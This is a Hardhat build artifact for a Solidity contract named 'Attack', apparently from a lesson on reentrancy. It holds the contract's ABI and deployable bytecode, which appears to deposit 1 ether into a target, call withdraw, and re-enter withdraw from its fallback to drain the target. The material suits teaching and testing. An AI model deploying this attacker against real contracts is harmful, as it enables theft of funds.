{
  "_format": "hh-sol-artifact-1",
  "contractName": "Attack",
  "sourceName": "contracts/sublesson/ReentrantVulnerable.sol",
  "abi": [
    {
      "inputs": [
        {
          "internalType": "address",
          "name": "_reentrantVulnerableAddress",
          "type": "address"
        }
      ],
      "stateMutability": "nonpayable",
      "type": "constructor"
    },
    {
      "stateMutability": "payable",
      "type": "fallback"
    },
    {
      "inputs": [],
      "name": "attack",
      "outputs": [],
      "stateMutability": "payable",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "getBalance",
      "outputs": [
        {
          "internalType": "uint256",
          "name": "",
          "type": "uint256"
        }
      ],
      "stateMutability": "view",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "reentrantVulnerable",
      "outputs": [
        {
          "internalType": "contract ReentrantVulnerable",
          "name": "",
          "type": "address"
        }
      ],
      "stateMutability": "view",
      "type": "function"
    }
  ],
  "bytecode": "0x608060405234801561001057600080fd5b5060405161089438038061089483398181016040528101906100329190610126565b6100647fa2d2fc3d9bc9191055f42c39bc95fd0ef8c83d4f20472549ef1143d300e7997f60001b61010e60201b60201c565b6100967f70631f567cd1dbe165f0c1b0ebf57cd7c2c308a76e051d2c51ffbca5328ac04360001b61010e60201b60201c565b6100c87f909f2fc0f79ef58df64df26c5bede6c28bb2830fe96940a89a166f7ced031fc460001b61010e60201b60201c565b806000806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff160217905550506101a1565b50565b6000815190506101208161018a565b92915050565b60006020828403121561013c5761013b610185565b5b600061014a84828501610111565b91505092915050565b600061015e82610165565b9050919050565b600073ffffffffffffffffffffffffffffffffffffffff82169050919050565b600080fd5b61019381610153565b811461019e57600080fd5b50565b6106e4806101b06000396000f3fe6080604052600436106100385760003560e01c806312065fe01461023b57806333684a05146102665780639e5faafc1461029157610039565b5b6100657f462076b619ecae62f94ddcdcc7462b2315454fda09a54b3d0e37092e2d8d88cd60001b61029b565b6100917fe8cbe20885d3624a51de49b99e2971277d26cf627855387fd5d194435941e52860001b61029b565b6100bd7f6c33ba9decee79fb85d6b8a8fe56fafd0a922649b2cf3b17891e2ee040b7992d60001b61029b565b670de0b6b3a764000060008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16311061020c5761012f7f26e66a9fd84106adb4513d562c191ce0e4a0be2c11bb46fa3b8df6320cfe0b1960001b61029b565b61015b7fd046ccfcb9c8c6710d7ac7774f6a6bac1b54bdcff6df2a09d9b3ddd251859d8b60001b61029b565b6101877fa02be08cb3247d3a831a37dff31489525af9736df80ee9624fd38ac3c5d66f3260001b61029b565b60008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16633ccfd60b6040518163ffffffff1660e01b8152600401600060405180830381600087803b1580156101ef57600080fd5b505af1158015610203573d6000803e3d6000fd5b50505050610239565b6102387f237476e35702c834420677a7cf005b915158d4bf1da11d6f91884ac4e95c77e560001b61029b565b5b005b34801561024757600080fd5b5061025061029e565b60405161025d9190610633565b60405180910390f35b34801561027257600080fd5b5061027b61032a565b6040516102889190610618565b60405180910390f35b61029961034e565b005b50565b60006102cc7fc1ea4055e5f41b77db00ab8a4ecd16e5c95a03fe0a72245fe4a2ab438c625e1e60001b61029b565b6102f87f912530528dbe0f877f83a80edbe0fdb1817ab373be80eaa27cff06ceeab2e60760001b61029b565b6103247f5c64aa7a3a10e3b4ba907695a7ec62396f4a5bb516d0f1282048af53033d8e2960001b61029b565b47905090565b60008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b61037a7f8f9e42a379f762ecadedbd22f063e2b6f7d6f07771b41b7018fca504fdebd18360001b61029b565b6103a67f77853827bce3f205c9e60739932bef96aed4c74f142fba3801dbf84dba7ba01460001b61029b565b6103d27f4b049410bf0de9b2fb3325aa78fcac7be908fc2ddb62b10aaae964a279fe599a60001b61029b565b6103fe7f92be756cfe18378be4612686284df1c4b1fab8edcd9cad41619b9e5ab3dd51a060001b61029b565b670de0b6b3a764000034101561041357600080fd5b61043f7fd41259ee934f5cca840833d9db371b7d2877c6d473833e7ed779771850aa184b60001b61029b565b61046b7f5a8604a3a593eb8be17850b83495bf3f12b21df95561bb35658093a43c422ea660001b61029b565b6104977fbd81a0d593445a2e59e7b67643335b8bfb8b38337dd58bb5c4eda5b0680a953c60001b61029b565b60008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663d0e30db0670de0b6b3a76400006040518263ffffffff1660e01b81526004016000604051808303818588803b15801561050757600080fd5b505af115801561051b573d6000803e3d6000fd5b505050505061054c7f0c09321b70a54b49c872e67ad82311ddb152f03149f03249cd59085b535b05cd60001b61029b565b6105787f2621fd7bde1d46e8a63b93b6edc141b888952603e78cdc950d351c6889c6048e60001b61029b565b60008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16633ccfd60b6040518163ffffffff1660e01b8152600401600060405180830381600087803b1580156105e057600080fd5b505af11580156105f4573d6000803e3d6000fd5b50505050565b61060381610678565b82525050565b6106128161066e565b82525050565b600060208201905061062d60008301846105fa565b92915050565b60006020820190506106486000830184610609565b92915050565b600073ffffffffffffffffffffffffffffffffffffffff82169050919050565b6000819050919050565b60006106838261068a565b9050919050565b60006106958261069c565b9050919050565b60006106a78261064e565b905091905056fea26469706673582212209a2c73c734ec4d15bac7f54d9b2977dcfd6ace57efda8cbc911d97bd1661772664736f6c63430008070033",
  "linkReferences": {},
  "deployedLinkReferences": {}
}